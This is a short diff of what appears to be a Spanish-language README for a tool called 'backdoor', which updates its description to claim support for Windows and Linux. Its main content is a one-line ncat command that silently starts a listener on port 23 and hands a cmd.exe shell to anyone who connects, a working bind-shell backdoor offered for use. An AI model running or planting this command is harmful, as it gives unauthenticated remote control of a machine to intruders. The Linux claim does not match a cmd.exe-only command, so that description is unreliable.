@@ -1,6 +1,6 @@
-# backdoor
+## backdoor
 
-Activa puerta trasera TelnetD para Windows
+Activa puerta trasera TelnetD para Windows y Linux
 
 start /B ncat -l -t -p 23 -e cmd.exe 
 
